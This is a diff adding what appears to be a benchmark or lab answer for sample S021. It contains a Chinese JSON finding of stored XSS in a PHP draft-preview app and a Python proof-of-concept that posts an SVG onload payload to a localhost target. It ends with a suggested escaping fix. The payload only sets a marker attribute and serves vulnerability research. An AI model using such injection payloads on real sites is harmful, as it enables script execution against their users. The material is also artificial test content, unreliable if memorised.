@@ -1,0 +1,111 @@
+```json
+{
+  "sample_id": "S021",
+  "prediction": "vulnerable",
+  "vulnerability_type": "XSS",
+  "locations": [
+    "F01:0009",
+    "F01:0019",
+    "F03:0016",
+    "F03:0020",
+    "F03:0039"
+  ],
+  "evidence": {
+    "source": "F01:0009 从 POST body 读取可控字符串；F01:0008 的 title 也可控。",
+    "flow": "F01:0019 将 body 绑定写入 lab_preview_drafts；F03:0016-F03:0020 按 id 读取 title/body。",
+    "guard": "无效：F03:0039 直接 echo $draft['body']，未做 htmlspecialchars 或 HTML 上下文编码；F03:0038 与 F02:0029 的 title 转义不覆盖 body。",
+    "sink": "F03:0039 在 div.draft-body 的 HTML 正文上下文原样输出 body。"
+  },
+  "prerequisites": [
+    "submit.php、preview.php 位于可通过 http://127.0.0.1:4280 访问的部署中；若在子目录，需用脚本参数指定。",
+    "无需登录即可 POST submit.php 写草稿，并用返回的 Location 中 id 访问 preview.php。",
+    "需要人工用浏览器打开 preview URL 观察 DOM/控制台，脚本不自动证明 JavaScript 执行。"
+  ],
+  "missing_context": [
+    "未提供实际浏览器渲染结果，需人工确认 onload 是否执行。",
+    "未提供应用具体挂载子路径，脚本以 --base 和 --submit-path 配置。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "先运行普通对照：python3 s021_poc.py --mode normal；再运行测试：python3 s021_poc.py --mode test。脚本默认目标 http://127.0.0.1:4280/submit.php；若应用挂载在 /S021，使用 --base http://127.0.0.1:4280/S021 或 --submit-path /S021/submit.php。脚本仅向 127.0.0.1 提交表单并打印 303 后的 preview URL，不外发数据。人工在浏览器打开打印的 preview URL：普通对照不应出现 data-s021；测试模式在 DevTools Console 执行 document.body.dataset.s021，若返回 xss 则确认存储型 XSS 执行。HTTP 响应体仅含 payload 字符串不算执行。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import argparse
+import urllib.error
+import urllib.parse
+import urllib.request
+from urllib.parse import urljoin
+
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+
+def build_url(base: str, path: str) -> str:
+    return urljoin(base.rstrip("/") + "/", path.lstrip("/"))
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--base", default="http://127.0.0.1:4280",
+                        help="目标基址，例如 http://127.0.0.1:4280 或 http://127.0.0.1:4280/S021")
+    parser.add_argument("--submit-path", default="/submit.php",
+                        help="submit.php 路径，默认 /submit.php")
+    parser.add_argument("--mode", choices=["normal", "test"], default="test",
+                        help="normal 为普通对照，test 为 SVG onload 测试输入")
+    args = parser.parse_args()
+
+    submit_url = build_url(args.base, args.submit_path)
+
+    if args.mode == "normal":
+        title = "S021 普通对照"
+        body = "普通正文S021"
+    else:
+        title = "S021 测试"
+        body = '<svg onload="document.body.setAttribute(\'data-s021\',\'xss\')"></svg>'
+
+    data = urllib.parse.urlencode({"title": title, "body": body}).encode("utf-8")
+    req = urllib.request.Request(
+        submit_url,
+        data=data,
+        method="POST",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+
+    opener = urllib.request.build_opener(NoRedirect)
+    status = None
+    headers = None
+    try:
+        resp = opener.open(req, timeout=10)
+        status = resp.status
+        headers = resp.headers
+        resp.close()
+    except urllib.error.HTTPError as e:
+        status = e.code
+        headers = e.headers
+        e.close()
+
+    print("submit_url =", submit_url)
+    print("status =", status)
+
+    loc = headers.get("Location") if headers is not None else None
+    if not loc:
+        print("未得到 Location；请检查 submit.php 路径、是否返回 303，或查看服务端日志。")
+        return 1
+
+    preview_url = urljoin(submit_url, loc)
+    print("preview_url =", preview_url)
+    print("请在浏览器打开 preview_url。普通模式对照应无 data-s021；")
+    print("测试模式在 DevTools Console 运行 document.body.dataset.s021，应返回 xss。")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+防护建议（未验证）：对 body 输出使用 htmlspecialchars($draft['body'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')；若确需富文本，采用白名单净化并对 URL 协议做约束。现有 title 的转义不能覆盖 body 输出上下文。
